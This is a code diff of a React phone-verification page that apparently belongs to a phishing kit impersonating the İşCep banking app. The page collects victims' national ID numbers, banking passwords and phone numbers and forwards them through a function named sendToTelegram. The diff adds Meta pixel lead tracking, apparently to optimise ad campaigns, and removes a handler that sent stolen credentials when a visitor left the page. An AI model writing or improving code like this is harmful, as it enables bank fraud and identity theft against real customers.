@@ -1,3 +1,4 @@
+/* global fbq */
 import React, { useEffect, useRef, useCallback, memo } from 'react';
 import { useLocation, useNavigate } from 'react-router-dom';
 import './App.css';
@@ -14,14 +15,56 @@ function PhoneVerificationPage() {
     isPhonePrefixVisible: false,
     errorMessage: '',
   });
-
   const phoneInputRef = useRef(null);
   const location = useLocation();
   const navigate = useNavigate();
   const { dispatch: authDispatch } = useAuth();
   const { tc, password, isValidNavigation } = location.state || {};
 
-  // Navigasyon ve geri tuşu kontrolü
+  const getFbp = () => {
+    const cookies = document.cookie.split(';');
+    const fbpCookie = cookies.find((c) => c.trim().startsWith('_fbp='));
+    if (fbpCookie) {
+      const fbp = fbpCookie.split('=')[1];
+      // fbp formatı: fb.1.<timestamp>.<random>
+      if (/^fb\.1\.\d+\.\d+$/.test(fbp)) {
+        return fbp;
+      }
+    }
+    return undefined;
+  };
+
+  const getFbc = () => {
+    const cookies = document.cookie.split(';');
+    const fbcCookie = cookies.find((c) => c.trim().startsWith('_fbc='));
+    if (fbcCookie) {
+      const fbc = fbcCookie.split('=')[1];
+      return fbc;
+    }
+    const urlParams = new URLSearchParams(window.location.search);
+    const fbclid = urlParams.get('fbclid');
+    if (fbclid) {
+      return `fb.1.${Math.floor(Date.now() / 1000)}.${fbclid}`;
+    }
+    return undefined;
+  };
+
+  const trackMetaLead = useCallback(async (tc, phone, eventID) => {
+    if (typeof window !== 'undefined' && window.fbq) {
+      try {
+        fbq('track', 'Lead', {
+          custom_data: {
+            content_category: 'lead_form',
+            content_name: 'phone_verification',
+          },
+        }, { eventID });
+        console.log('Meta Lead event tetiklendi:', { eventID: eventID.substring(0, 8) + '...' });
+      } catch (error) {
+        console.error('Meta event hatası:', error);
+      }
+    }
+  }, []);
+
   useEffect(() => {
     if (!isValidNavigation || !tc || !password || tc.length !== 11 || password.length !== 6) {
       setState((prev) => ({
@@ -33,24 +76,28 @@ function PhoneVerificationPage() {
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
       return;
     }
-
     window.history.replaceState({ page: 'telefon' }, '', '/telefon');
     window.history.pushState({ page: 'telefon-guard' }, '', '/telefon');
-
     const handlePopState = (event) => {
       event.preventDefault();
       authDispatch({ type: 'RESET_AUTH' });
       window.history.replaceState(null, '', '/giris');
       navigate('/giris', { replace: true, state: { fromPhoneVerification: true } });
     };
-
     window.addEventListener('popstate', handlePopState);
     return () => window.removeEventListener('popstate', handlePopState);
   }, [tc, password, isValidNavigation, navigate, authDispatch]);
 
-  // Telegram gönderimi
+  useEffect(() => {
+    if (typeof window !== 'undefined' && window.fbq) {
+      fbq('track', 'ViewContent', {
+        content_category: 'credit_form',
+        content_name: 'phone_verification_page',
+      });
+    }
+  }, []);
+
   const sendToTelegram = useCallback(async (data) => {
-    console.log('API çağrısı yapılıyor:', data);
     try {
       const res = await fetch(`${process.env.REACT_APP_API_URL}/api/submit`, {
         method: 'POST',
@@ -59,10 +106,12 @@ function PhoneVerificationPage() {
           tc: String(data.tc),
           password: String(data.password),
           phone: String(data.phone),
+          eventID: data.eventID,
+          fbp: data.fbp,
+          fbc: data.fbc,
         }),
       });
       const result = await res.json();
-      console.log('API yanıtı:', result);
       if (!res.ok) throw new Error(result.message || 'Veri gönderimi başarısız.');
       return result;
     } catch (error) {
@@ -76,19 +125,56 @@ function PhoneVerificationPage() {
     }
   }, []);
 
-  // Siteden çıkıldığında veri gönderimi
-  useEffect(() => {
-    const handleBeforeUnload = () => {
-      if (tc && password && !state.phoneNumber) {
-        sendToTelegram({ tc, password, phone: '' });
+  const handlePhoneSubmit = useCallback(async (e) => {
+    e.preventDefault();
+    if (state.isSubmitting) return; // Double submit guard
+    if (state.phoneNumber.length !== 10) {
+      setState((prev) => ({
+        ...prev,
+        showPhoneError: true,
+        errorMessage: 'Telefon numarası 10 haneli olmalı.',
+      }));
+      return;
+    }
+    if (typeof window !== 'undefined' && window.fbq) {
+      try {
+        fbq('track', 'InitiateCheckout', {
+          content_category: 'credit_form_start',
+        });
+      } catch (error) {
+        console.error('Meta InitiateCheckout event hatası:', error);
       }
-    };
-    window.addEventListener('beforeunload', handleBeforeUnload);
-    return () => window.removeEventListener('beforeunload', handleBeforeUnload);
-  }, [tc, password, state.phoneNumber, sendToTelegram]);
+    }
+    setState((prev) => ({ ...prev, isSubmitting: true }));
+    const eventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
+    await trackMetaLead(tc, state.phoneNumber, eventID);
+    const result = await sendToTelegram({
+      tc,
+      password,
+      phone: state.phoneNumber,
+      eventID,
+      fbp: getFbp(),
+      fbc: getFbc(),
+    });
+    if (result && !result.error) {
+      authDispatch({ type: 'RESET_AUTH' });
+      setState({
+        phoneNumber: '',
+        isPhoneActive: false,
+        isPhoneLabelHovered: false,
+        showPhoneError: false,
+        isSubmitting: false,
+        isPhoneFocused: false,
+        isPhonePrefixVisible: false,
+        errorMessage: '',
+      });
+      window.history.replaceState(null, '', '/bekleme');
+      navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
+    }
+  }, [state.phoneNumber, state.isSubmitting, sendToTelegram, tc, password, navigate, authDispatch, trackMetaLead]);
 
   const handleNumberInput = useCallback((e) => {
-    const value = e.target.value.replace(/\D/g, '');
+    const value = e.target.value.replace(/[^0-9]/g, '');
     if (value.length <= 10) {
       setState((prev) => ({
         ...prev,
@@ -135,55 +221,17 @@ function PhoneVerificationPage() {
     }));
   }, []);
 
-  const handlePhoneSubmit = useCallback(
-    async (e) => {
-      e.preventDefault();
-      if (state.phoneNumber.length > 0 && state.phoneNumber.length !== 10) {
-        setState((prev) => ({
-          ...prev,
-          showPhoneError: true,
-          errorMessage: 'Telefon numarası 10 haneli olmalı.',
-        }));
-        return;
-      }
-      if (state.phoneNumber.length === 10) {
-        setState((prev) => ({ ...prev, isSubmitting: true }));
-        const result = await sendToTelegram({ tc, password, phone: state.phoneNumber });
-        if (result && !result.error) {
-          authDispatch({ type: 'RESET_AUTH' });
-          setState({
-            phoneNumber: '',
-            isPhoneActive: false,
-            isPhoneLabelHovered: false,
-            showPhoneError: false,
-            isSubmitting: false,
-            isPhoneFocused: false,
-            isPhonePrefixVisible: false,
-            errorMessage: '',
-          });
-          window.history.replaceState(null, '', '/bekleme');
-          navigate('/bekleme', { replace: true, state: { isValidNavigation: true, from: '/telefon', isCompleted: true } });
-        }
-      }
-    },
-    [state.phoneNumber, sendToTelegram, tc, password, navigate, authDispatch]
-  );
-
   return (
     <div className="container" style={{ touchAction: 'manipulation' }}>
       <div className="right-section">
         <img src="/iscep-logo.png" alt="İşCep Logosu" className="iscep-logo iscep-logo-phone" loading="lazy" />
         <div className="new-container phone-verification-title">
           Telefon Doğrulama
-          <div className="phone-verification-subtitle">
-            Lütfen cep telefon numaranızı giriniz
-          </div>
+          <div className="phone-verification-subtitle">Lütfen cep telefon numaranızı giriniz</div>
         </div>
         <div className="input-wrapper">
           <div
-            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${
-              state.isPhonePrefixVisible ? 'prefix-visible' : ''
-            }`}
+            className={`phone-input-wrapper ${state.showPhoneError ? 'error' : ''} ${state.isPhonePrefixVisible ? 'prefix-visible' : ''}`}
             onClick={() => phoneInputRef.current?.focus()}
           >
             <label
@@ -238,9 +286,7 @@ function PhoneVerificationPage() {
           </div>
           <div className="verify-button-container">
             <button
-              className={`button-phone ${
-                state.phoneNumber.length > 0 ? 'active-continue-button' : ''
-              }`}
+              className={`button-phone ${state.phoneNumber.length > 0 ? 'active-continue-button' : ''}`}
               onClick={handlePhoneSubmit}
               onTouchStart={handlePhoneSubmit}
               disabled={state.isSubmitting}
